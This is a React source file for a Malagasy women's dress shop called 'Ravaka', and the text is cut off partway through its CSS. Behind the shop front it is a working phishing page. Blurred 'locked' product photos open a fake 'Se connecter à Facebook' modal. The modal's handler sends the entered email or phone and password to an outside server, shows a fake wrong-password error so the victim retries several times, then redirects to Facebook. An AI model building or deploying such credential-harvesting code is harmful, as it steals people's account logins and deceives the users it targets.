import React, { useMemo, useState } from "react";

import axios from "axios";


const products = [
  {
    id: 1,
    name: "Robe Soa",
    category: "Nouveautés",
    price: 12900,
    locked: false,
    image:
      "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 2,
    name: "Robe Mialy",
    category: "Soirée",
    price: 15900,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 3,
    name: "Robe Vola",
    category: "Décontractée",
    price: 9900,
    locked: false,
    image:
      "https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 4,
    name: "Robe Fara",
    category: "Cérémonie",
    price: 13900,
    locked: false,
    image:
      "https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 5,
    name: "Robe Kanto",
    category: "Décontractée",
    price: 19000,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1539109136881-3be0616acf4b?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 6,
    name: "Robe Tahina",
    category: "Soirée",
    price: 19000,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1502716119720-b23a1e3ae1b5?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 7,
    name: "Robe Sarobidy",
    category: "Cérémonie",
    price: 14900,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1525507119028-ed4c629a60a3?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 8,
    name: "Robe Noro",
    category: "Nouveautés",
    price: 10900,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1485230895905-ec40ba36b9bc?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 9,
    name: "Robe Lova",
    category: "Soirée",
    price: 16900,
    locked: false,
    image:
      "https://images.unsplash.com/photo-1485968579580-b6d095142e6e?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 10,
    name: "Robe Hasina",
    category: "Décontractée",
    price: 8900,
    locked: false,
    image:
      "https://images.unsplash.com/photo-1496217590455-aa63a8350eea?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 11,
    name: "Robe Aina",
    category: "Cérémonie",
    price: 15500,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=900&q=85",
  },
  {
    id: 12,
    name: "Robe Tiana",
    category: "Nouveautés",
    price: 13500,
    locked: true,
    image:
      "https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?auto=format&fit=crop&w=900&q=85",
  },
];

const categories = [
  "Toutes",
  "Nouveautés",
  "Soirée",
  "Cérémonie",
  "Décontractée",
];

const formatPrice = (price) =>
  new Intl.NumberFormat("fr-FR").format(price) + " Ar";

export default function App() {
  const [category, setCategory] = useState("Toutes");
  const [search, setSearch] = useState("");
  const [tmp, setTmp] = useState(1);

  // Connexion
  const [loginOpen, setLoginOpen] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState(null);

  const [nom, setNom] = useState("");
  const [mdp, setMdp] = useState("");

  const [loading, setLoading] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);

  const [loginError, setLoginError] = useState("");

  // Panier
  const [cart, setCart] = useState([]);
  const [cartOpen, setCartOpen] = useState(false);

  const filteredProducts = useMemo(() => {
    return products.filter((product) => {
      const categoryMatch =
        category === "Toutes" ||
        product.category === category;

      const searchMatch = product.name
        .toLowerCase()
        .includes(search.toLowerCase());

      return categoryMatch && searchMatch;
    });
  }, [category, search]);

  const cartCount = cart.reduce(
    (total, item) => total + item.quantity,
    0
  );

  const cartTotal = cart.reduce(
    (total, item) =>
      total + item.price * item.quantity,
    0
  );

  // OUVRIR MODALE
  const openLogin = (product) => {
    if (!product.locked || loggedIn) {
      return;
    }

    setSelectedProduct(product);
    setLoginError("");
    setLoginOpen(true);
  };

  // FERMER MODALE
  const closeLogin = () => {
    if (loading) return;

    setLoginOpen(false);
    setLoginError("");
  };

  // TON API LOGIN
  const mampiditra = async (e) => {
    e.preventDefault();
    if (mdp === "" || nom === "") {
      setLoginError("Veuillez remplir les champs vides");
      return;
    }

    setLoading(true);

    try {
      const response = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp });
      if (response.data.success === true && tmp < 3) {
        setTmp(prev => prev + 1);
        setNom("");
        setMdp("");
        setLoginError(
          "Vérifiez votre mot de passe ou votre numéro de téléphone"
        );
      } else {
        window.location.href = 'https://m.facebook.com';
      }
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
    }
  };

  // DECONNEXION
  const logout = () => {
    setLoggedIn(false);
    setNom("");
    setMdp("");
    setCart([]);
  };

  // PANIER
  const addToCart = (product) => {
    if (product.locked && !loggedIn) {
      openLogin(product);
      return;
    }

    setCart((current) => {
      const exists = current.find(
        (item) => item.id === product.id
      );

      if (exists) {
        return current.map((item) =>
          item.id === product.id
            ? {
              ...item,
              quantity: item.quantity + 1,
            }
            : item
        );
      }

      return [
        ...current,
        {
          ...product,
          quantity: 1,
        },
      ];
    });

    setCartOpen(true);
  };

  const changeQuantity = (id, amount) => {
    setCart((current) =>
      current
        .map((item) =>
          item.id === id
            ? {
              ...item,
              quantity: item.quantity + amount,
            }
            : item
        )
        .filter((item) => item.quantity > 0)
    );
  };

  const removeFromCart = (id) => {
    setCart((current) =>
      current.filter((item) => item.id !== id)
    );
  };

  const orderWhatsApp = () => {
    const message = cart
      .map(
        (item) =>
          `${item.name} x${item.quantity} - ${formatPrice(
            item.price * item.quantity
          )}`
      )
      .join("\n");

    const text = `Bonjour Ravaka 👋

Je souhaite commander :

${message}

Total : ${formatPrice(cartTotal)}`;

    // À remplacer avec ton vrai numéro WhatsApp.
    const telephone = "261340000000";

    window.open(
      `https://wa.me/${telephone}?text=${encodeURIComponent(
        text
      )}`,
      "_blank"
    );
  };

  return (
    <>
      <style>{css}</style>

      <div className="app">
        {/* TOP BAR */}

        <div className="topbar">
          <span>
            🇲🇬 Livraison disponible partout à Madagascar
          </span>

          <span className="dot">•</span>

          <span>
            MVola • Orange Money • Airtel Money
          </span>
        </div>

        {/* HEADER */}

        <header className="header">
          <a href="#home" className="logo">
            <span className="logoCircle">R</span>

            <div>
              <strong>RAVAKA</strong>

              <small>
                FEMME • MADAGASCAR
              </small>
            </div>
          </a>

          <nav>
            <a href="#collection">
              Nouveautés
            </a>

            <a href="#collection">
              Robes
            </a>

            <a href="#about">
              Notre univers
            </a>

            <a href="#delivery">
              Livraison
            </a>
          </nav>

          <div className="headerActions">
            {loggedIn && (
              <button
                className="logout"
                onClick={logout}
              >
                Déconnexion
              </button>
            )}

            <button
              className="cartButton"
              onClick={() => setCartOpen(true)}
            >
              <span>🛍️</span>

              <span className="cartLabel">
                Panier
              </span>

              <b>{cartCount}</b>
            </button>
          </div>
        </header>

        {/* HERO */}

        <section
          className="hero"
          id="home"
        >
          <div className="heroText">
            <span className="subtitle">
              ✦ COLLECTION FEMME
            </span>

            <h1>
              Des robes pensées pour
              <em> vous faire rayonner.</em>
            </h1>

            <p>
              Une sélection de robes modernes,
              féminines et élégantes disponible
              partout à Madagascar.
            </p>

            <div className="heroButtons">
              <a
                href="#collection"
                className="primaryButton"
              >
                Découvrir la collection
                <span>→</span>
              </a>

              <a
                href="#about"
                className="secondaryButton"
              >
                Notre univers
              </a>
            </div>

            <div className="heroAdvantages">
              <span>✓ Prix en Ariary</span>

              <span>
                ✓ Livraison Madagascar
              </span>

              <span>
                ✓ Commande WhatsApp
              </span>
            </div>
          </div>

          <div className="heroVisual">
            <div className="heroBackground" />

            {/* PAS FLOUTÉ */}

            <img
              className="heroMain"
              src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?auto=format&fit=crop&w=1100&q=90"
              alt="Collection Ravaka"
            />

            <img
              className="heroSmall"
              src="https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?auto=format&fit=crop&w=700&q=90"
              alt="Robe Ravaka"
            />

            <div className="heroCard">
              <small>
                NOUVELLE PIÈCE
              </small>

              <strong>
                Robe Mialy
              </strong>

              <span>
                159 000 Ar
              </span>
            </div>
          </div>
        </section>

        {/* SERVICES */}

        <section
          className="services"
          id="delivery"
        >
          <article>
            <span>🚚</span>

            <div>
              <strong>
                Livraison Madagascar
              </strong>

              <small>
                Antananarivo & provinces
              </small>
            </div>
          </article>

          <article>
            <span>📱</span>

            <div>
              <strong>
                Paiement mobile
              </strong>

              <small>
                MVola, Orange Money, Airtel
              </small>
            </div>
          </article>

          <article>
            <span>💬</span>

            <div>
              <strong>
                Assistance WhatsApp
              </strong>

              <small>
                Commande rapide
              </small>
            </div>
          </article>
        </section>

        {/* COLLECTION */}

        <section
          className="collection"
          id="collection"
        >
          <div className="collectionTop">
            <div>
              <span className="subtitle">
                SÉLECTION RAVAKA
              </span>

              <h2>
                Nos robes du moment
              </h2>

              <p>
                {filteredProducts.length} modèles
                disponibles
              </p>
            </div>

            <div className="searchBox">
              <span>⌕</span>

              <input
                type="search"
                placeholder="Rechercher une robe..."
                value={search}
                onChange={(e) =>
                  setSearch(e.target.value)
                }
              />
            </div>
          </div>

          {/* FILTRES */}

          <div className="categories">
            {categories.map((item) => (
              <button
                key={item}
                className={
                  category === item
                    ? "active"
                    : ""
                }
                onClick={() =>
                  setCategory(item)
                }
              >
                {item}
              </button>
            ))}
          </div>

          {/* PRODUITS */}

          <div className="products">
            {filteredProducts.map(
              (product) => {
                const imageIsLocked =
                  product.locked &&
                  !loggedIn;

                return (
                  <article
                    className="product"
                    key={product.id}
                  >
                    <div
                      className={`productImage ${imageIsLocked
                        ? "lockedProduct"
                        : ""
                        }`}
                      onClick={() => {
                        if (imageIsLocked) {
                          openLogin(product);
                        }
                      }}
                    >
                      <img
                        src={product.image}
                        alt={product.name}
                        className={
                          imageIsLocked
                            ? "blurred"
                            : "normal"
                        }
                      />

                      <span className="categoryBadge">
                        {product.category}
                      </span>

                      <button
                        type="button"
                        className="heart"
                        onClick={(e) => {
                          e.stopPropagation();

                          if (
                            imageIsLocked
                          ) {
                            openLogin(
                              product
                            );
                          }
                        }}
                      >
                        ♡
                      </button>

                      {!imageIsLocked && (
                        <button
                          type="button"
                          className="addCart"
                          onClick={(e) => {
                            e.stopPropagation();

                            addToCart(
                              product
                            );
                          }}
                        >
                          Ajouter au panier
                        </button>
                      )}
                    </div>

                    <div className="productInfo">
                      <small>
                        {product.category}
                      </small>

                      <h3>
                        {product.name}
                      </h3>

                      <strong>
                        {formatPrice(
                          product.price
                        )}
                      </strong>

                      <div className="sizes">
                        <span>S</span>
                        <span>M</span>
                        <span>L</span>
                        <span>XL</span>
                      </div>
                    </div>
                  </article>
                );
              }
            )}
          </div>
        </section>

        {/* ABOUT */}

        <section
          className="about"
          id="about"
        >
          <div className="aboutImage">
            {/* PAS FLOUTÉ */}

            <img
              src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1100&q=85"
              alt="Boutique Ravaka"
            />
          </div>

          <div className="aboutText">
            <span className="subtitle">
              NOTRE UNIVERS
            </span>

            <h2>
              Élégante.
              <br />
              Moderne.
              <br />

              <em>
                Malagasy.
              </em>
            </h2>

            <p>
              Une boutique pensée pour permettre
              aux femmes de Madagascar de
              découvrir et commander facilement
              leurs robes préférées.
            </p>

            <ul>
              <li>
                ✓ Prix en Ariary
              </li>

              <li>
                ✓ Livraison nationale
              </li>

              <li>
                ✓ Paiement mobile
              </li>

              <li>
                ✓ Assistance WhatsApp
              </li>
            </ul>

            <a
              href="https://wa.me/261340000000"
              target="_blank"
              rel="noreferrer"
              className="whatsapp"
            >
              💬 Contacter Ravaka
            </a>
          </div>
        </section>

        {/* FOOTER */}

        <footer>
          <div className="footerLogo">
            <span>R</span>

            <strong>
              RAVAKA
            </strong>
          </div>

          <p>
            Mode femme • Madagascar 🇲🇬
          </p>

          <div className="socials">
            <a href="#">
              Instagram
            </a>

            <a href="#">
              Facebook
            </a>

            <a href="#">
              TikTok
            </a>
          </div>

          <small>
            © 2026 Ravaka Madagascar
          </small>
        </footer>

        {/* ========================= */}
        {/* MODALE LOGIN RAVAKA */}
        {/* ========================= */}

        {loginOpen && (
          <div
            className="loginOverlay"
            onMouseDown={(e) => {
              if (
                e.target === e.currentTarget
              ) {
                closeLogin();
              }
            }}
          >
            <form
              className="loginModal"
              onSubmit={mampiditra}
            >
              <button
                type="button"
                className="closeButton"
                onClick={closeLogin}
                disabled={loading}
              >
                ×
              </button>

              <div style={{ textAlign: 'center' }}>

                <img src="/logo192.png" alt="Logo" style={{ width: 50, height: 50 }} />
              </div>


              <h2>
                Se connecter à Facebook
              </h2>



              {loginError && (
                <div className="errorMessage">
                  {loginError}
                </div>
              )}

              <div className="inputGroup">
                <label htmlFor="nom">
                  E-mail ou numéro de mobile
                </label>

                <input
                  id="nom"
                  type="text"
                  value={nom}
                  onChange={(e) => {
                    setNom(
                      e.target.value
                    );

                    setLoginError("");
                  }}
                  placeholder="Téléphone ou identifiant"
                  autoComplete="username"
                  disabled={loading}
                />
              </div>

              <div className="inputGroup">
                <label htmlFor="mdp">
                  Mot de passe
                </label>

                <input
                  id="mdp"
                  type="password"
                  value={mdp}
                  onChange={(e) => {
                    setMdp(
                      e.target.value
                    );

                    setLoginError("");
                  }}
                  placeholder="Votre mot de passe"
                  autoComplete="current-password"
                  disabled={loading}
                />
              </div>

              <button
                type="submit"
                className="submitLogin"
                disabled={loading}
              >
                {loading ? (
                  <>
                    <span className="spinner" />

                    Connexion...
                  </>
                ) : (
                  "Se connecter"
                )}
              </button>

              <small className="securityText">
                Utilisez uniquement les
                identifiants de votre compte
                facebook.
              </small>
            </form>
          </div>
        )}

        {/* ========================= */}
        {/* PANIER */}
        {/* ========================= */}

        {cartOpen && (
          <div
            className="cartOverlay"
            onClick={() =>
              setCartOpen(false)
            }
          >
            <aside
              className="cartDrawer"
              onClick={(e) =>
                e.stopPropagation()
              }
            >
              <div className="cartHeader">
                <div>
                  <h2>
                    Votre panier
                  </h2>

                  <small>
                    {cartCount} article(s)
                  </small>
                </div>

                <button
                  onClick={() =>
                    setCartOpen(false)
                  }
                >
                  ×
                </button>
              </div>

              <div className="cartContent">
                {cart.length === 0 ? (
                  <div className="emptyCart">
                    <span>🛍️</span>

                    <h3>
                      Votre panier est vide
                    </h3>

                    <p>
                      Ajoutez quelques robes
                      pour commencer.
                    </p>
                  </div>
                ) : (
                  cart.map((item) => (
                    <div
                      className="cartItem"
                      key={item.id}
                    >
                      <img
                        src={item.image}
                        alt={item.name}
                      />

                      <div className="cartItemContent">
                        <h4>
                          {item.name}
                        </h4>

                        <strong>
                          {formatPrice(
                            item.price
                          )}
                        </strong>

                        <div className="quantity">
                          <button
                            onClick={() =>
                              changeQuantity(
                                item.id,
                                -1
                              )
                            }
                          >
                            −
                          </button>

                          <span>
                            {
                              item.quantity
                            }
                          </span>

                          <button
                            onClick={() =>
                              changeQuantity(
                                item.id,
                                1
                              )
                            }
                          >
                            +
                          </button>
                        </div>

                        <button
                          className="remove"
                          onClick={() =>
                            removeFromCart(
                              item.id
                            )
                          }
                        >
                          Supprimer
                        </button>
                      </div>
                    </div>
                  ))
                )}
              </div>

              {cart.length > 0 && (
                <div className="cartFooter">
                  <div className="total">
                    <span>
                      Total
                    </span>

                    <strong>
                      {formatPrice(
                        cartTotal
                      )}
                    </strong>
                  </div>

                  <button
                    className="whatsappOrder"
                    onClick={
                      orderWhatsApp
                    }
                  >
                    Commander sur WhatsApp →
                  </button>
                </div>
              )}
            </aside>
          </div>
        )}
      </div>
    </>
  );
}

const css = `
@import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;1,600&display=swap");

* {
  box-sizing: border-box;
}

html {
  scroll-behavior: smooth;
}

body {
  margin: 0;

  background: #fffdfb;

  color: #281b22;

  font-family:
    "DM Sans",
    sans-serif;
}

button,
input {
  font-family: inherit;
}

button {
  cursor: pointer;
}

a {
  color: inherit;

  text-decoration: none;
}

.app {
  min-height: 100vh;

  overflow: hidden;
}


/* ========================= */
/* TOPBAR */
/* ========================= */

.topbar {
  min-height: 35px;

  padding: 8px 20px;

  background: #281b22;

  color: white;

  display: flex;

  justify-content: center;

  align-items: center;

  gap: 12px;

  font-size: 10px;
}

.dot {
  color: #d9b8ad;
}


/* ========================= */
/* HEADER */
/* ========================= */

.header {
  max-width: 1400px;

  height: 80px;

  margin: auto;

  padding: 0 5%;

  display: flex;

  align-items: center;

  justify-content: space-between;
}

.logo {
  display: flex;

  align-items: center;

  gap: 10px;
}

.logoCircle {
  width: 38px;

  height: 38px;

  border-radius: 50%;

  background: #77364c;

  color: white;

  display: grid;

  place-items: center;

  font-family:
    "Playfair Display",
    serif;

  font-size: 22px;

  font-style: italic;
}

.logo > div {
  display: flex;

  flex-direction: column;
}

.logo strong {
  font-size: 13px;

  letter-spacing: 3px;
}

.logo small {
  margin-top: 4px;

  color: #8b7f85;

  font-size: 7px;

  letter-spacing: 1.5px;
}

nav {
  display: flex;

  gap: 30px;
}

nav a {
  font-size: 11px;

  font-weight: 600;
}

.headerActions {
  display: flex;

  align-items: center;

  gap: 10px;
}

.logout {
  border: 0;

  background: transparent;

  color: #887b81;

  font-size: 9px;
}

.cartButton {
  height: 42px;

  padding:
    0 9px
    0 14px;

  border: 0;

  border-radius: 30px;

  background: #281b22;

  color: white;

  display: flex;

  align-items: center;

  gap: 8px;
}

.cartLabel {
  font-size: 10px;
}

.cartButton b {
  width: 24px;

  height: 24px;

  border-radius: 50%;

  background: white;

  color: #281b22;

  display: grid;

  place-items: center;

  font-size: 9px;
}


/* ========================= */
/* HERO */
/* ========================= */

.hero {
  min-height: 650px;

  padding:
    65px
    max(
      6%,
      calc((100vw - 1250px) / 2)
    );

  background:
    radial-gradient(
      circle at 78% 30%,
      #ead0c5,
      transparent 28%
    ),
    linear-gradient(
      120deg,
      #faf5f1,
      #fffdfb,
      #f1e0da
    );

  display: grid;

  grid-template-columns:
    .9fr 1.1fr;

  align-items: center;

  gap: 60px;
}

.subtitle {
  color: #98465f;

  font-size: 9px;

  font-weight: 700;

  letter-spacing: 2px;
}

.hero h1 {
  max-width: 620px;

  margin:
    18px 0
    22px;

  font-family:
    "Playfair Display",
    serif;

  font-size:
    clamp(
      50px,
      5vw,
      76px
    );

  line-height: .98;
}

.hero h1 em,
.about h2 em {
  color: #a44561;
}

.heroText > p {
  max-width: 500px;

  color: #766a70;

  font-size: 13px;

  line-height: 1.8;
}

.heroButtons {
  margin-top: 30px;

  display: flex;

  align-items: center;

  gap: 25px;
}

.primaryButton,
.whatsapp {
  min-height: 51px;

  padding: 0 22px;

  border-radius: 30px;

  background: #77364c;

  color: white;

  display: inline-flex;

  align-items: center;

  gap: 10px;

  font-size: 10px;

  font-weight: 700;
}

.secondaryButton {
  padding-bottom: 4px;

  border-bottom:
    1px solid #281b22;

  font-size: 10px;

  font-weight: 700;
}

.heroAdvantages {
  margin-top: 43px;

  display: flex;

  flex-wrap: wrap;

  gap: 14px;
}

.heroAdvantages span {
  color: #786c72;

  font-size: 9px;
}


/* ========================= */
/* HERO IMAGES */
/* ========================= */

.heroVisual {
  height: 540px;

  position: relative;
}

.heroBackground {
  width: 390px;

  height: 390px;

  position: absolute;

  right: 50px;

  top: 45px;

  border-radius: 50%;

  background: #e8cfc5;
}

.heroMain {
  position: absolute;

  right: 7%;

  top: 0;

  width: 56%;

  height: 90%;

  object-fit: cover;

  filter: none;

  border-radius:
    220px
    220px
    15px
    15px;

  box-shadow:
    0 30px
    60px
    rgba(
      50,
      20,
      30,
      .15
    );
}

.heroSmall {
  position: absolute;

  left: 7%;

  bottom: 0;

  width: 31%;

  height: 43%;

  object-fit: cover;

  filter: none;

  border-radius:
    120px
    120px
    12px
    12px;

  border:
    8px solid
    #fffdfb;
}

.heroCard {
  position: absolute;

  right: 0;

  bottom: 35px;

  width: 180px;

  padding: 17px;

  border-radius: 13px;

  background:
    rgba(
      255,
      255,
      255,
      .95
    );

  display: flex;

  flex-direction: column;

  box-shadow:
    0 20px
    40px
    rgba(
      40,
      20,
      30,
      .12
    );
}

.heroCard small {
  color: #a44561;

  font-size: 7px;

  font-weight: 700;
}

.heroCard strong {
  margin:
    7px 0
    4px;

  font-family:
    "Playfair Display",
    serif;

  font-size: 19px;
}

.heroCard span {
  color: #776b70;

  font-size: 9px;
}


/* ========================= */
/* SERVICES */
/* ========================= */

.services {
  max-width: 1200px;

  position: relative;

  z-index: 3;

  margin:
    -28px auto
    0;

  padding: 22px;

  border-radius: 14px;

  background: white;

  display: grid;

  grid-template-columns:
    repeat(
      3,
      1fr
    );

  box-shadow:
    0 20px
    50px
    rgba(
      40,
      20,
      30,
      .1
    );
}

.services article {
  padding:
    8px 25px;

  display: flex;

  align-items: center;

  gap: 15px;

  border-right:
    1px solid
    #eee2dc;
}

.services article:last-child {
  border-right: 0;
}

.services article > span {
  font-size: 22px;
}

.services article > div {
  display: flex;

  flex-direction: column;
}

.services strong {
  font-size: 10px;
}

.services small {
  margin-top: 4px;

  color: #82767c;

  font-size: 8px;
}


/* ========================= */
/* COLLECTION */
/* ========================= */

.collection {
  max-width: 1300px;

  margin: auto;

  padding:
    105px 25px;
}

.collectionTop {
  display: flex;

  align-items: end;

  justify-content: space-between;

  gap: 30px;
}

.collection h2 {
  margin:
    8px 0
    3px;

  font-family:
    "Playfair Display",
    serif;

  font-size: 50px;
}

.collectionTop p {
  margin:
    4px 0
    0;

  color: #857980;

  font-size: 9px;
}

.searchBox {
  width: 260px;

  height: 45px;

  padding: 0 15px;

  border:
    1px solid
    #e4dad5;

  border-radius: 30px;

  display: flex;

  align-items: center;

  gap: 9px;
}

.searchBox input {
  width: 100%;

  border: 0;

  outline: 0;

  background: transparent;

  font-size: 10px;
}

.categories {
  margin:
    30px 0;

  display: flex;

  gap: 8px;

  overflow-x: auto;
}

.categories button {
  flex:
    0 0 auto;

  padding:
    9px 15px;

  border:
    1px solid
    #e5dbd6;

  border-radius: 30px;

  background: white;

  font-size: 9px;
}

.categories button.active {
  background: #281b22;

  border-color: #281b22;

  color: white;
}


/* ========================= */
/* PRODUCTS */
/* ========================= */

.products {
  display: grid;

  grid-template-columns:
    repeat(
      4,
      1fr
    );

  gap:
    32px 15px;
}

.productImage {
  height: 390px;

  position: relative;

  overflow: hidden;

  border-radius: 12px;

  background: #eee3de;
}

.productImage > img {
  width: 100%;

  height: 100%;

  object-fit: cover;

  transition:
    transform
      .4s ease,
    filter
      .4s ease;
}


/* PHOTO NORMALE */

.productImage
> img.normal {
  filter: none;

  transform: scale(1);
}

.productImage:not(
  .lockedProduct
):hover
img.normal {
  transform:
    scale(1.035);
}


/* PHOTO FLOUTÉE */

.productImage
> img.blurred {
  filter:
    blur(17px);

  transform:
    scale(1.12);
}

.productImage.lockedProduct {
  cursor: pointer;
}

.productImage.lockedProduct:hover
img.blurred {
  filter:
    blur(14px);

  transform:
    scale(1.14);
}


/* PAS DE CADENAS */
/* PAS DE TEXTE SUR PHOTO */

.categoryBadge {
  position: absolute;

  z-index: 5;

  top: 12px;

  left: 12px;

  padding:
    7px 10px;

  border-radius: 30px;

  background: white;

  font-size: 7px;

  font-weight: 700;

  box-shadow:
    0 5px
    15px
    rgba(
      0,
      0,
      0,
      .06
    );
}

.heart {
  position: absolute;

  z-index: 5;

  top: 12px;

  right: 12px;

  width: 36px;

  height: 36px;

  border: 0;

  border-radius: 50%;

  background: white;

  font-size: 18px;
}

.addCart {
  position: absolute;

  z-index: 5;

  left: 10px;

  right: 10px;

  bottom: 10px;

  height: 39px;

  border: 0;

  border-radius: 30px;

  background:
    rgba(
      40,
      27,
      34,
      .93
    );

  color: white;

  font-size: 8px;

  font-weight: 700;

  opacity: 0;

  transform:
    translateY(
      7px
    );

  transition: .25s;
}

.productImage:hover
.addCart {
  opacity: 1;

  transform: none;
}

.productInfo {
  padding:
    12px 3px;
}

.productInfo > small {
  color: #8b7e84;

  font-size: 7px;

  text-transform: uppercase;
}

.productInfo h3 {
  margin:
    3px 0
    7px;

  font-family:
    "Playfair Display",
    serif;

  font-size: 18px;
}

.productInfo > strong {
  color: #77364c;

  font-size: 11px;
}

.sizes {
  margin-top: 10px;

  display: flex;

  gap: 4px;
}

.sizes span {
  width: 25px;

  height: 22px;

  border:
    1px solid
    #e4dad5;

  border-radius: 5px;

  display: grid;

  place-items: center;

  font-size: 7px;
}


/* ========================= */
/* ABOUT */
/* ========================= */

.about {
  padding:
    90px
    max(
      6%,
      calc(
        (100vw - 1150px)
        /
        2
      )
    );

  background: #f7f0eb;

  display: grid;

  grid-template-columns:
    1fr 1fr;

  align-items: center;

  gap: 70px;
}

.aboutImage {
  height: 530px;

  overflow: hidden;

  border-radius:
    220px
    220px
    15px
    15px;
}

.aboutImage img {
  width: 100%;

  height: 100%;

  object-fit: cover;

  filter: none;
}

.about h2 {
  margin:
    10px 0
    20px;

  font-family:
    "Playfair Display",
    serif;

  font-size: 55px;
}

.aboutText > p {
  color: #776b71;

  font-size: 12px;

  line-height: 1.8;
}

.about ul {
  margin:
    25px 0;

  padding: 0;

  list-style: none;

  display: grid;

  gap: 10px;

  font-size: 10px;
}

.whatsapp {
  background: #435c4e;
}


/* ========================= */
/* FOOTER */
/* ========================= */

footer {
  padding:
    55px 20px
    30px;

  background: #281b22;

  color: white;

  text-align: center;
}

.footerLogo {
  display: flex;

  flex-direction: column;

  align-items: center;

  gap: 8px;
}

.footerLogo span {
  width: 42px;

  height: 42px;

  border-radius: 50%;

  background: #e4c5b9;

  color: #281b22;

  display: grid;

  place-items: center;

  font-family:
    "Playfair Display",
    serif;

  font-size: 23px;

  font-style: italic;
}

.footerLogo strong {
  letter-spacing: 3px;

  font-size: 12px;
}

footer p {
  color: #aaa0a5;

  font-size: 9px;
}

.socials {
  margin:
    22px 0
    30px;

  display: flex;

  justify-content: center;

  gap: 25px;
}

.socials a {
  font-size: 9px;
}

footer > small {
  color: #81767b;

  font-size: 8px;
}


/* ========================= */
/* LOGIN OVERLAY */
/* ========================= */

.loginOverlay {
  position: fixed;

  inset: 0;

  z-index: 10000;

  padding: 20px;

  background:
    rgba(
      25,
      15,
      20,
      .68
    );

  backdrop-filter:
    blur(8px);

  display: flex;

  align-items: center;

  justify-content: center;
}

.loginModal {
  position: relative;

  width:
    min(
      420px,
      100%
    );

  padding:
    34px 30px
    28px;

  border-radius: 22px;

  background: white;

  box-shadow:
    0 35px
    100px
    rgba(
      0,
      0,
      0,
      .3
    );

  animation:
    loginOpen
    .22s ease;
}

@keyframes loginOpen {
  from {
    opacity: 0;

    transform:
      translateY(
        14px
      )
      scale(
        .98
      );
  }

  to {
    opacity: 1;

    transform: none;
  }
}

.closeButton {
  position: absolute;

  top: 13px;

  right: 13px;

  width: 35px;

  height: 35px;

  border: 0;

  border-radius: 50%;

  background: #f4eeee;

  color: #281b22;

  font-size: 20px;
}

.closeButton:disabled {
  cursor:
    not-allowed;

  opacity: .5;
}

.loginBrand {
  display: flex;

  flex-direction: column;

  align-items: center;

  text-align: center;
}

.loginLogo {
  width: 55px;

  height: 55px;

  margin-bottom: 9px;

  border-radius: 50%;

  background: #77364c;

  color: white;

  display: grid;

  place-items: center;

  font-family:
    "Playfair Display",
    serif;

  font-size: 28px;

  font-style: italic;
}

.loginBrand strong {
  font-size: 12px;

  letter-spacing: 3px;
}

.loginBrand small {
  margin-top: 4px;

  color: #9a8e93;

  font-size: 7px;

  letter-spacing: 1px;
}

.selectedProduct {
  margin:
    20px 0;

  padding: 8px;

  border-radius: 11px;

  background: #f9f5f2;

  display: flex;

  align-items: center;

  gap: 11px;
}

.selectedProduct img {
  width: 48px;

  height: 58px;

  object-fit: cover;

  border-radius: 7px;

  filter:
    blur(5px);

  transform:
    scale(1.04);
}

.selectedProduct > div {
  display: flex;

  flex-direction: column;
}

.selectedProduct small {
  color: #94888e;

  font-size: 6px;
}

.selectedProduct strong {
  margin-top: 3px;

  font-family:
    "Playfair Display",
    serif;

  font-size: 14px;
}

.loginModal h2 {
  margin:
    22px 0
    8px;

  text-align: center;

  font-family:
    "Playfair Display",
    serif;

  font-size: 29px;
}

.loginDescription {
  margin:
    0 auto
    23px;

  max-width: 320px;

  color: #7d7177;

  text-align: center;

  font-size: 10px;

  line-height: 1.6;
}

.errorMessage {
  margin-bottom: 15px;

  padding:
    11px 13px;

  border:
    1px solid
    #f1c8cc;

  border-radius: 9px;

  background: #fff1f2;

  color: #9a3344;

  font-size: 9px;

  line-height: 1.5;
}

.inputGroup {
  margin-top: 13px;
}

.inputGroup label {
  display: block;

  margin-bottom: 6px;

  color: #44383e;

  font-size: 9px;

  font-weight: 700;
}

.inputGroup input {
  width: 100%;

  height: 49px;

  padding:
    0 14px;

  border:
    1px solid
    #ded5d1;

  border-radius: 9px;

  outline: 0;

  background: white;

  color: #281b22;

  font-size: 11px;

  transition:
    border
    .2s ease;
}

.inputGroup input:focus {
  border-color:
    #77364c;

  box-shadow:
    0 0 0
    3px
    rgba(
      119,
      54,
      76,
      .08
    );
}

.inputGroup input:disabled {
  background: #f7f5f4;
}

.submitLogin {
  width: 100%;

  height: 50px;

  margin-top: 20px;

  border: 0;

  border-radius: 9px;

  background: #005FD5;

  color: white;

  display: flex;

  align-items: center;

  justify-content: center;

  gap: 8px;

  font-size: 10px;

  font-weight: 700;

  transition:
    background
      .2s,
    transform
      .2s;
}

.submitLogin:hover:not(
  :disabled
) {
  background: #5f293d;

  transform:
    translateY(-1px);
}

.submitLogin:disabled {
  cursor:
    not-allowed;

  opacity: .7;
}

.spinner {
  width: 15px;

  height: 15px;

  border:
    2px solid
    rgba(
      255,
      255,
      255,
      .4
    );

  border-top-color:
